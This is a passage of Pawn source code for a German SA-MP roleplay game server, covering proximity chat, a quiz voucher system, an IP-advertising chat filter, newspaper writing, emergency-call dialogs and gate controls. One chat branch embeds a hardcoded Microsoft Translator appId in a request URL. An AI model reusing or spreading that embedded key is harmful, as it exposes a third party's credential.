					//printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
					if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
					{
						SendClientMessage(i, col1, string);
					}
					else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
					{
						SendClientMessage(i, col2, string);
					}
					else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
					{
						SendClientMessage(i, col3, string);
					}
					else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
					{
						SendClientMessage(i, col4, string);
					}
					else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
					{
						SendClientMessage(i, col5, string);
					}
				}
				else
				{
					SendClientMessage(i, col1, string);
				}
			}
		}
	}//not connected
	return 1;
}

Function ProxDetectorEx(Float:radi, playerid, string[],col1,col2,col3,col4,col5)
{
	if(IsPlayerConnected(playerid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		//radi = 2.0; //Trigger Radius
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i))
			{
				if(!BigEar[i])
				{
					GetPlayerPos(i, posx, posy, posz);
					tempposx = (oldposx -posx);
					tempposy = (oldposy -posy);
					tempposz = (oldposz -posz);
					//printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
					if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
					{
						SendClientMessageEx(i, col1, string);
					}
					else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
					{
						SendClientMessageEx(i, col2, string);
					}
					else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
					{
						SendClientMessageEx(i, col3, string);
					}
					else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
					{
						SendClientMessageEx(i, col4, string);
					}
					else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
					{
						SendClientMessageEx(i, col5, string);
					}
				}
				else
				{
					SendClientMessageEx(i, col1, string);
				}
			}
		}
	}//not connected
	return 1;
}
Function ProxDetectorS(Float:radi, playerid, targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		//radi = 2.0; //Trigger Radius
		GetPlayerPos(targetid, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		//printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}
Function Production()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pFishes] >= 5)
			{
				if(FishCount[i] >= 3)
				{
					PlayerInfo[i][pFishes] = 0;
				}
				else
				{
				FishCount[i] += 1;
                }
			}
		    if(PlayerDrunk[i] > 0)
			{
				PlayerDrunk[i] = 0;
				PlayerDrunkTime[i] = 0;
				SetPlayerWeather(i,12);
				SetPlayerDrunkLevel (i, 0);
				GameTextForPlayer(i, "~p~Nicht mehr~n~~w~Betrunken", 3500, 1);
			}
		}
	}
}

Function OnPlayerText(playerid, text[])
{














    if(active_quiz == 1)
    {
        if(!strcmp(text, ServerAntwort, true))
        {
            new textstringd[256];
            format(textstringd,sizeof(textstringd),"%s hat das Quiz gelöst! Frage: %s - Antwort: %s",GetName(playerid),ServerFrage,ServerAntwort);
            SendClientMessageToAll(COLOR_LIGHTBLUE,textstringd);// /duty Sound von RPG Busfhrer

			new string3 = random(25000000000);


			new ahh434[128];
	        format(ahh434, sizeof(ahh434), "/gutscheine/%d.ini",string3);
			dini_Create(ahh434);
			new ahh4343[128];
	        format(ahh4343, sizeof(ahh4343), "* Du hast einen %s erhalten! Code: %d Verwende: /gutschein",ServerGeld,string3);
			SendClientMessage(playerid, COLOR_LIGHTBLUE,ahh4343);

	    	if(quiz_result == 0)
			{
				dini_IntSet(ahh434, "result", 1);
			}
	    	if(quiz_result == 1)
			{
				dini_IntSet(ahh434, "result", 2);
			}
	    	if(quiz_result == 2)
			{
				dini_IntSet(ahh434, "result", 3);
			}
	    	if(quiz_result == 3)
			{
				dini_IntSet(ahh434, "result", 4);
			}
	    	if(quiz_result == 4)
			{
				dini_IntSet(ahh434, "result", 5);
			}
	    	if(quiz_result == 5)
			{
				dini_IntSet(ahh434, "result", 6);
			}
	    	if(quiz_result == 6)
			{
				dini_IntSet(ahh434, "result", 7);
			}
	    	if(quiz_result == 7)
			{
				dini_IntSet(ahh434, "result", 8);
			}

            for(new i=0; i<MAX_PLAYERS; i++)
            {
                PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
            }
            // Hier der Rest (Gewinnausschüttung etc...
            active_quiz = 0;
            TextDrawSetString(Copyright,"www.gta.de");
        }
    }

/*
	if(active_quiz == 1)
	{
	    if(text[128] == ServerAntwort[220])
	    {
	        new textstringd[128];
	        format(textstringd,sizeof(textstringd),"%s hat das Quiz gelöst! Frage: %s - Antwort: %s",GetName(playerid),ServerFrage,ServerAntwort);
	        SendClientMessageToAll(COLOR_LIGHTBLUE,textstringd);// /duty Sound von RPG Busfhrer
			active_quiz = 0;
			GivePlayerMoneySave(playerid, ServerGeld[220]);
	        for(new i=0; i<MAX_PLAYERS; i++)
	        {
	        PlayerPlaySound(i, 1057, 0.0, 0.0, 0.0);
	        }
	    }
	}
*/
	new lastidx = (strlen(text) - 1);
	if(text[lastidx] == '.')
	    text[lastidx] = ' ';

	new countit = 0;
	for(new x=0; x<strlen(text); x++)
	{
		if(text[x] == '.' && text[x+1] <= '9' && text[x+1] >= '0') // Es wurde ein Punkt und eine Zahl dahinter geschrieben!
		{
		    countit++;
		}
		else if(text[x] == '.' && text[x+2] <= '9' && text[x+2] >= '0') // Es wurde ein Punkt, Leerzeichen und eine Zahl dahinter geschrieben!
		{
		    countit++;
		}
	}
	if(countit >= 2 && PlayerInfo[playerid][pAdmin] <1) // Dreimal und eine IP wird erkannt
	if(strfind(text,"5.135.112.217:4021",true) != 0) // NICHT die TS-IP
	if(strfind(text,"5.135.112.217:4021",true) != 0)
	{
		new textstring[128], name[MAX_PLAYER_NAME];
		GetPlayerName(playerid,name,sizeof(name));
		format(textstring,sizeof(textstring),"AdmWarning %s wird verdächtigt eine IP zu verschicken!",name);
		ABroadCast(COLOR_LIGHTRED,textstring,1);
		format(textstring,sizeof(textstring),"AdmWarning %s: %s",name,text);
		ABroadCast(COLOR_LIGHTRED,textstring,1);
		SendClientMessage(playerid,COLOR_RED,"Es ist nicht erlaubt IPs in den Chat zu Schreiben!");
		gPlayerAbwerbeTrys[playerid]++;
		if(gPlayerAbwerbeTrys[playerid] >= 3)
		{
		    format(textstring,sizeof(textstring),"%s wurde vom Server gekickt, Grund: Abwerbe)",name);
		    SendClientMessageToAll(COLOR_RED,textstring);
      		SetTimerEx("kicktimerfake", 100,false,"i",playerid);
		}
		return 0;
	}







	new sendername[MAX_PLAYER_NAME];
	new tmp[256];
	new string[256];
	GetPlayerName(playerid,sendername,sizeof(sendername));
	if(PlayerInfo[playerid][pMuted] == 1)
	{
	    format(string, sizeof(string), "Du kannst nichts schreiben du bist noch für %d Minuten gemutet.", PlayerInfo[playerid][pMutedTime]);
		SendClientMessage(playerid, COLOR_RED, string);
//		SendClientMessage(playerid, TEAM_CYAN_COLOR, " Du kannst nichts schreiben, da dich ein Admin gemutet hat!");
		return 0;
	}
	if(PlayerInfo[playerid][pTot] == 1)
	{
		SendClientMessage(playerid, TEAM_CYAN_COLOR, " Du kannst nicht Reden da du im Krankenhaus liegst!");
		return 0;
	}
	if(PlayerInfo[playerid][pMauled] == 1)
	{
	    SendClientMessage(playerid, TEAM_CYAN_COLOR, " Du hast ein Mundtape!");
	    return 0;
	}
	if(WritingPaper[playerid] > 0)
	{
	    new line;
        new nstring[512];
        new idx;
        new length = strlen(text);
		while ((idx < length) && (text[idx] <= ' '))
		{
			idx++;
		}
		new offset = idx;
		new result[64];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = text[idx];
			idx++;
		}
		result[idx - offset] = EOS;
		if(!strlen(result))
		{
		    if(WritingLine[playerid] == 1) { SendClientMessage(playerid, COLOR_GRAD2, "* Schreibe nun den Titel des Zeitungsartikels."); }
		    else { SendClientMessage(playerid, COLOR_LIGHTRED, "* Schreibe nun eine Textzeile des Zeitungsartikels."); }
			return 0;
		}
		format(nstring, sizeof(nstring), "%s", text);
		switch(WritingLine[playerid])
		{
		    case 1:
		    {
		        new fstring[MAX_PLAYER_NAME];
		        GetPlayerName(playerid, sendername, sizeof(sendername));
				format(fstring, sizeof(fstring), "%s", sendername);
				strmid(PaperInfo[WritingPaperNumber[playerid]][PaperMaker], fstring, 0, strlen(fstring), 255);
		        strmid(PaperInfo[WritingPaperNumber[playerid]][PaperTitle], nstring, 0, strlen(nstring), 255);
		        line = 0; WritingLine[playerid] = 2;
		        SendClientMessage(playerid, COLOR_LIGHTRED, "* Du hast nun 7 Linien zu Verfügung! Schreibe diese in den Chat.");
		    }
		    case 2:
		    {
		        strmid(PaperInfo[WritingPaperNumber[playerid]][PaperText1], nstring, 0, strlen(nstring), 255);
		        line = 1; WritingLine[playerid] = 3;
		    }
		    case 3:
		    {
		        strmid(PaperInfo[WritingPaperNumber[playerid]][PaperText2], nstring, 0, strlen(nstring), 255);
		        line = 2; WritingLine[playerid] = 4;
		    }
		    case 4:
		    {
		        strmid(PaperInfo[WritingPaperNumber[playerid]][PaperText3], nstring, 0, strlen(nstring), 255);
		        line = 3; WritingLine[playerid] = 5;
		    }
		    case 5:
		    {
		        strmid(PaperInfo[WritingPaperNumber[playerid]][PaperText4], nstring, 0, strlen(nstring), 255);
		        line = 4; WritingLine[playerid] = 6;
		    }
		    case 6:
		    {
		        strmid(PaperInfo[WritingPaperNumber[playerid]][PaperText5], nstring, 0, strlen(nstring), 255);
		        line = 5; WritingLine[playerid] = 7;
		    }
		    case 7:
		    {
		        strmid(PaperInfo[WritingPaperNumber[playerid]][PaperText6], nstring, 0, strlen(nstring), 255);
		        line = 6; WritingLine[playerid] = 8;
		    }
		    case 8:
		    {
		        strmid(PaperInfo[WritingPaperNumber[playerid]][PaperText7], nstring, 0, strlen(nstring), 255);
		        PaperInfo[WritingPaperNumber[playerid]][PaperUsed] = 1;
		        SavePapers();
		        line = 7; WritingLine[playerid] = 0; WritingPaper[playerid] = 0; WritingPaperNumber[playerid] = 999;
		    }
		}
		if(line > 0)
		{
			format(string, sizeof(string), "* Du hast Zeile %d des Zeitungsartikels geschrieben.", line);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			if(line == 7)
			{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Dein Zeitungsartikel kann nun von Zeitungsjungen verteilt werden.");
			}
		}
	    return 0;
	}
	if(CallLawyer[playerid] == 111)
	{
	    new idx;
	    tmp = strtoknew(text, idx);
	    if ((strcmp("yes", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("yes")))
		{
		    GetPlayerName(playerid, sendername, sizeof(sendername));
		    format(string, sizeof(string), "** %s ist im Knast und benötigt einen Anwalt. Begib dich zum Police Department.", sendername);
	    	SendJobMessage(2, COLOR_YELLOW, string);
	    	SendJobMessage(2, COLOR_YELLOW, "* Frage einen Polizisten, ob er dir erlaubt jemanden zu befreien. (/accept Anwalt [deine id])");
	    	SendClientMessage(playerid, COLOR_LIGHTRED, "Alle aktiven Anwälte wurden informiert.");
	    	WantLawyer[playerid] = 0;
			CallLawyer[playerid] = 0;
	    	return 0;
		}
		else
		{
		    SendClientMessage(playerid, COLOR_LIGHTRED, " Es sind keine Anwälte online.");
		    WantLawyer[playerid] = 0;
			CallLawyer[playerid] = 0;
		    return 0;
		}
	}
	if(TalkingLive[playerid] != 255)
	{
		GetPlayerName(playerid, sendername, sizeof(sendername));
  		format(string, sizeof(string), "Live Spieler %s: %s", sendername, text);
		OOCNews(COLOR_NEWS, string);
		return 0;
	}
	if(Mobile[playerid] != 255)
	{
		new idx;
		tmp = strtoknew(text, idx);
		GetPlayerName(playerid, sendername, sizeof(sendername));
		format(string, sizeof(string), "%s sagt (Handy): %s", sendername, text);
		ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		//printf("callers line %d called %d caller %d",Mobile[Mobile[playerid]],Mobile[playerid],playerid);
		if(Mobile[playerid] == 914)
		{
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Gesprächspartner: Entschuldigen sie, ich verstehe sie nicht!");
				return 0;
			}
			new turner[MAX_PLAYER_NAME];
			new wanted[128];
			GetPlayerName(playerid, turner, sizeof(turner));
			SendClientMessage(playerid, TEAM_CYAN_COLOR, "Gesprächspartner: Ich habe die aktiven Einsatzkräfte alarmiert.");
			SendClientMessage(playerid, TEAM_CYAN_COLOR, "Vielen Dank, dass sie den Fall gemeldet haben.");
			format(wanted, sizeof(wanted), "Zentrale: Es gibt einen neuen Fall. Reporter: %s",turner);
			SendTeamBeepMessage(1, TEAM_CYAN_COLOR, wanted);
			format(wanted, sizeof(wanted), "Gesuchter: %s",text);
			SendTeamMessage(1, TEAM_CYAN_COLOR, wanted);
			SendClientMessage(playerid, COLOR_GRAD2, "   Der Gesprächspartner hat aufgelegt!");
			Mobile[playerid] = 255;
			return 0;
		}
		if(Mobile[playerid] == 913)
		{
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Gesprächspartner: Entschuldigen sie, ich verstehe sie nicht!");
				return 0;
			}
			if ((strcmp("Niemand", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("Niemand")))
			{
				new turner[MAX_PLAYER_NAME];
				new wanted[128];
				GetPlayerName(playerid, turner, sizeof(turner));
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Polizeimeldestelle: Ich habe die aktiven Einsatzkräfte alarmiert.");
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Vielen Dank, dass sie den Fall gemeldet haben.");
				format(wanted, sizeof(wanted), "Zentrale: Es gibt einen neuen Fall. Reporter: %s",turner);
				SendFamilyMessage(1, COLOR_DBLUE, wanted);
				format(wanted, sizeof(wanted), "Verbrechen: %s   Gesuchter: Unbekannt",PlayerCrime[playerid][pAccusing]);
				SendFamilyMessage(1, COLOR_DBLUE, wanted);
				SendClientMessage(playerid, COLOR_GRAD2, "   Der Gesprächspartner hat aufgelegt!");
				Mobile[playerid] = 255;
				return 0;
			}
			new badguy;
			//badguy = strval(tmp);
			badguy = ReturnUser(tmp);
			if (IsPlayerConnected(badguy))
			{
			    if(badguy != INVALID_PLAYER_ID)
			    {
					if (IsACop(badguy) || gTeam[badguy] == 2 || gTeam[badguy] == 1)
					{
						SendClientMessage(playerid, COLOR_DBLUE, "Polizeimeldestelle: Dies ist keine Scherzhotline!!");
						SendClientMessage(playerid, COLOR_GRAD2, "   Der Gesprächspartner hat aufgelegt!");
						Mobile[playerid] = 255;
						return 0;
					}
					if (WantedPoints[badguy] > 0)
					{
						SendClientMessage(playerid, COLOR_DBLUE, "Polizeimeldestelle: Die Einsatzkräfte sind schon zu dieser Person alarmiert worden!");
						SendClientMessage(playerid, COLOR_DBLUE, "Vielen Dank, dass sie den Fall gemeldet haben.");
						SendClientMessage(playerid, COLOR_GRAD2, "   Der Gesprächspartner hat aufgelegt!");
						Mobile[playerid] = 255;
						return 0;
					}
					if (badguy == playerid)
					{
						SendClientMessage(playerid, COLOR_DBLUE, "Polizeimeldestelle: Dies ist keine Scherzhotline!!");
						SendClientMessage(playerid, COLOR_GRAD2, "   Der Gesprächspartner hat aufgelegt!");
						Mobile[playerid] = 255;
						return 0;
					}
					SendClientMessage(playerid, TEAM_CYAN_COLOR, "Polizeimeldestelle: Ich habe die aktiven Einsatzkräfte alarmiert.");
					SendClientMessage(playerid, TEAM_CYAN_COLOR, "Vielen Dank, dass sie den Fall gemeldet haben.");
					SendClientMessage(playerid, COLOR_GRAD2, "   Der Gesprächspartner hat aufgelegt!");
					Mobile[playerid] = 255;
					return 0;
				}//invalid id
				return 0;
			}//not connected
			else
			{
				format(string, sizeof(string), "Polizeimeldestelle: Uns ist niemand mit dem Namen %s bekannt. Ist dies der richtige Name?",tmp);
				SendClientMessage(playerid, COLOR_DBLUE, string);
				return 0;
			}
		}
		if(Mobile[playerid] == 912)
		{
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Gesprächspartner: Entschuldigen sie, ich verstehe sie nicht!");
				return 0;
			}
			strmid(PlayerCrime[playerid][pAccusing], text, 0, strlen(text), 255);
			SendClientMessage(playerid, COLOR_DBLUE, "Polizeimeldestelle: Kennen sie den Namen des Gesuchten? Nennen sie ihn oder schreiben sie 'Niemand'.");
			Mobile[playerid] = 913;
			return 0;
		}
		if(Mobile[playerid] == 911)
		{
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "Gesprächspartner: Entschuldigen sie, ich verstehe sie nicht!");
				SendClientMessage(playerid, COLOR_ALLDEPT, "Benötigen sie die Polizei oder einen Sanitäter?");
				return 0;
			}
			else if ((strcmp("Polizei", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("Polizei")))
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "Gesprächspartner: Ich leite sie zur Polizeimeldestelle um. Bitte warten...");
				Mobile[playerid] = 912;
				SendClientMessage(playerid, COLOR_DBLUE, "Polizeimeldestelle: Bitte beschreiben sie das Verbrechen kurz!");
				return 0;
			}
			else if ((strcmp("Sanitäter", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("Sanitäter")))
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "Gesprächspartner: Ich leite sie zur Notrufzentrale um. Bitte warten...");
				Mobile[playerid] = 914;
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Polizeimeldestelle: Bitte beschreiben sie den Vorfall kurz!");
				return 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "Gesprächspartner: Entschuldigen sie, ich verstehe sie nicht!");
				SendClientMessage(playerid, COLOR_ALLDEPT, "Benötigen sie die Polizei oder einen Sanitäter?");
				return 0;
			}
		}
		if(IsPlayerConnected(Mobile[playerid]))
		{
		    if(Mobile[Mobile[playerid]] == playerid)
		    {
				SendClientMessage(Mobile[playerid], COLOR_YELLOW,string);
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_YELLOW," Es ist niemand am anderem Ende der Leitung...");
		}
		return 0;
	}
/*
    if(ReportCall[playerid] != 999)
    {
        new idx;
        tmp = strtoknew(text, idx);
        GetPlayerName(playerid, sendername, sizeof(sendername));
        format(string, sizeof(string), "[SUPPORT] %s: %s", sendername, text);
        SendClientMessage(playerid, COLOR_LIGHTGREEN,string);
        if(ReportCall[ReportCall[playerid]] == playerid)
		{
        	SendClientMessage(ReportCall[playerid], COLOR_LIGHTGREEN,string);
  		}
  		return 0;
	}
*/
	if (realchat)
	{
	    if(gPlayerLogged[playerid] == 0)
	    {
	        return 0;
      	}
      	if(PlayerInfo[playerid][pTot] == 1)
		{
			return 0;
		}
		if(PlayerInfo[playerid][pMauled] == 1)
		{
		    SendClientMessage(playerid, COLOR_GREY, "Dir wurde dein Mund zugeklebt, du kannst nichst sagen!");
		    return 0;
		}
//		SetPlayerChatBubble(playerid, text, 0xFF2800FF, 70.0, 5000);
		GetPlayerName(playerid, sendername, sizeof(sendername));







// 21 cm
		if(PlayerInfo[playerid][pCarkeys] == 36)
		{
		    new Link[1200];
		    format(Link,sizeof(Link),"api.microsofttranslator.com/V2/Ajax.svc/Translate?appId=6635D742380CF583FEE16FF83E80BC8238F166E3&to=tr&text=%s",text);
		    for(new c; c < strlen(Link)+1; c++)
		    {
		         if(Link[c] == ' ') Link[c] = '+';
		    }
			HTTP(playerid, HTTP_GET, Link, "", "UpdateResponse");

			return 0;
		}

		format(string, sizeof(string), "%s sagt: %s", sendername, text);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		SetPlayerChatBubble(playerid, text, 0xFF2800FF, 70.0, 5000);






		return 0;
	}
	return 1;
}
/*
Function SetCamBack(playerid)
{
    if(IsPlayerConnected(playerid))
    {
		new Float:plocx,Float:plocy,Float:plocz;
		GetPlayerPos(playerid, plocx, plocy, plocz);
		SetPlayerPos(playerid, -1863.15, -21.6598, 1060.15); // Warp the player
		SetPlayerInterior(playerid,14);
	}
}
*/
Function FixHour(hour)
{
	hour = timeshift+hour;
	if (hour < 0)
	{
		hour = hour+24;
	}
	else if (hour > 23)
	{
		hour = hour-24;
	}
	shifthour = hour;
	return 1;
}

Function AddsOn()
{
	adds=1;
	return 1;
}

stock IsValidDate(day, month, year)
{
	new maxDays;
	if (year < 1900 || year > 2010) return 0; // Bad Year
	switch (month)
	{
		case 1,3,5,7,8,10,12: maxDays = 31;
		case 4,6,9,11: maxDays = 30;
		case 2:
		{
			if(IsLeapYear(year))
		 	{
			 	maxDays = 29;
			}
			else
			{
				maxDays = 28;
			}
		}
		default: return 0; // Bad Month
	}

	if (day < 1 || day > maxDays) return 0; // Bad Day
	return 1;
}

stock IsLeapYear(year)
{
	/*if (year % 4 == 0 &&
		(year % 100 != 0 ||
		 year % 400 == 0)) {
		return 1;
	} else {
		return 0;
	}*/
	return ( year % 4 == 0 && (year % 100 != 0 || year % 400 == 0) );
}



Function CountDown4()
{
	GameTextForAll("4",1000,3);
	SetTimer("CountDown3",1000,0);
	return 1;
}

Function CountDown3()
{
	GameTextForAll("3",1000,3);
	SetTimer("CountDown2",1000,0);
	return 1;
}

Function CountDown2()
{
	GameTextForAll("2",1000,3);
	SetTimer("CountDown1",1000,0);
	return 1;
}

Function CountDown1()
{
	GameTextForAll("1",1000,3);
	SetTimer("CountDownLos",1000,0);
	return 1;
}

Function CountDownLos()
{
	GameTextForAll("~g~] ! LOS LOS LOS ! ]",1000,3);
	return 1;
}

stock DisplayForPlayer(playerid)
{
	if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
	{
	    return 0;
	}
	if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
	if(JobDuty[playerid] > 0)
	{
	    return 0;
	}
	if(PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pLeader] == 22)
	if(JobDuty[playerid] > 0)
	{
	    return 0;
	}
	if(PlayerInfo[playerid][pJob] == 17)
	if(Mullabfuhr[playerid] > 0)
	{
	    return 0;
	}
	if(PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10 || PlayerInfo[playerid][pJob] == 14)
	if(TransportDuty[playerid] > 0)
	{
	    return 0;
	}
	return 1;
}

stock IsAnAdmin(playerid)
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
		return 1;
	return 0;
}

stock IsPlayerInFrac(playerid,fracid)
{
	if (PlayerInfo[playerid][pMember] == fracid || PlayerInfo[playerid][pLeader] == fracid)
		return 1;
	return 0;
}

stock CountPlayersInFrac(fracid)
{
	new count = 0;
	for(new i=0; i<GetMaxPlayers(); i++)
	{
	    if(IsPlayerConnected(i) && IsPlayerInFrac(i,fracid))
	    {
			count++;
		}
	}
	return count;
}

stock CountDutyFiremen()
{
    new count = 0;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && IsPlayerInFrac(i,22) && JobDuty[i] == 1 && FWDuty[i] == 1)
		{
			count++;
		}
	}
	return count;
}

Function PlaySoundForPlayer(playerid,soundid)
{
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid,X,Y,Z);
	PlayerPlaySound(playerid,soundid,X,Y,Z);
}
Function CloseMVTor()
{
	MoveDynamicObject(MVTor17,1546.24048, -1629.73340, 13.86161, 4);
	MoveDynamicObject(MVTor3,1546.26062, -1621.75806, 13.86780, 4);
	return 1;
}

Function Closewheeltor()
{
	MoveDynamicObject(wheeltor,1812.9000244141, -2071.8999023438, 15.300000190735,3);
	return 1;
}


forward GangjailEinbruch(playerid);
public GangjailEinbruch(playerid)
{
		new rand = random(1);
		if(rand == 0)
        {
                MoveDynamicObject(gangtor,204.89999389648, -235.69999694824, -1.2999999523163,3.0);
                SendClientMessage(playerid,COLOR_GREEN,"Du hast es geschafft! Jetzt aber schnell Das Tor schließt in 50sek!");
        }
        else
        {
                SendClientMessage(playerid,COLOR_RED,"Schade. Es hat nicht geklappt.");
        }
        return 1;
}

Function CloseGangjailEinbruch()
{
    MoveDynamicObject(gangtor,204.89999389648, -235.69999694824, 2.4000000953674,3);
	return 1;
}


Function htornew1close()
{
	MoveObject(htornew1,2424.13770, 58.84145, 26.49200,2.0);
	return 1;
}

Function htornew2close()
{
	MoveObject(htornew2,2424.13232, 53.39064, 26.49200,2.0);
	return 1;
}





Function CloseGangJailTor()
{
	MoveDynamicObject(gangtor,204.89999389648, -235.69999694824, 2.4000000953674,3);
	return 1;
}

Function CloseGangJailTuer()
{
	MoveDynamicObject(gangtuer,193, -227.80000305176, 0.80000001192093,3);
	return 1;
}
Function CloseVagosTor()
{
	MoveDynamicObject(vagostor,2800.6000976563, -1585.5, 12.699999809265,3);
	return 1;
}
Function CloseMVTor2()
{
	MoveDynamicObject(MVTor2,1584.80530, -1638.13293, 12.45620, 4);
	return 1;
}

Function Zu()
{
	MoveDynamicObject(tuer1,1387.9091796875,-971.20501708984,5652.53515625, 100.0);
	MoveDynamicObject(tuer2,1387.9912109375,-991.5615234375,5652.17578125, 100.0);
	return 1;
}
Function Auf()
{
	MoveDynamicObject(tuer1,1387.9091796875,-971.20501708984,5000.5351562, 100.0);
	MoveDynamicObject(tuer2,1387.9912109375,-991.5615234375,5000.17578125, 100.0);
	return 1;
}
Function CloseMVTor4()
{
	MoveDynamicObject(MVTor4,309.39999389648, -1554.8000488281, 32.200000762939, 3.0);
	return 1;
}
Function CloseMVTor3()
{
    MoveObjektRot(MVTor3, 0.00000, -90.00000, -90.00000,25);
//	MoveDynamicObject(MVTor3,1539.8000488281, -1627.6999511719, 15.199999809265, 3.0);
	return 1;
}

stock AtATM(playerid)
{
 	for(new atm=0; atm<sizeof(ATMs); atm++)
 	{
 	    if(IsPlayerInRangeOfPoint(playerid,2.5,ATMs[atm][0],ATMs[atm][1],ATMs[atm][2]))
 	    {
 	        return 1;
		}
	}
	return 0;
}

Function DisMarker(playerid)
{
	DisablePlayerCheckpoint(playerid);
}


Function IsAbf(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader];
	    new member = PlayerInfo[playerid][pMember];
	    if(member==3)
		{
		    return 1;
		}
		else if(leader==3)
		{
		    return 1;
		}
	}
	return 0;
}

Function SetPlayerPosEx(playerid,Float:Xpos,Float:Ypos,Float:Zpos,Float:Angle)
{
    SetPlayerPos(playerid,Xpos,Ypos,Zpos);
    SetPlayerFacingAngle(playerid,Angle);
}

Function UnsetAfterTutorial(playerid)
{
	if(IsPlayerConnected(playerid))
	{
        AfterTutorial[playerid] = 0;
	}
	return 1;
}

Function ShowPlayerFractionCommands(playerid)
{
    if(PlayerInfo[playerid][pMember] > 0 || PlayerInfo[playerid][pLeader] > 0)
    {
        SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION /fkasse (Fraktionskasse)");
	}
	if(gTeam[playerid] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
	{
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  (/r)adio (/d)epartments (/m)egaphone (/su)spect /arrest /duty /wanted /cuff /zivil /rbball /ticket /sperre");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /gov)ernment /orten /tazer /frisk /take /sirene /schild /rb /rbb /sperrewegall /setrangname");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /zollcontrol /uclight /punkte /ucl /mv /ucldel /deskkick");
		SendClientMessage(playerid,COLOR_GRAD5,"FRAKTION  /nagelband (/nb) /nagelbandweg (/nbw) /nagelbandwegall (/nbwa) /spionagetool (FBI) /gefangene");
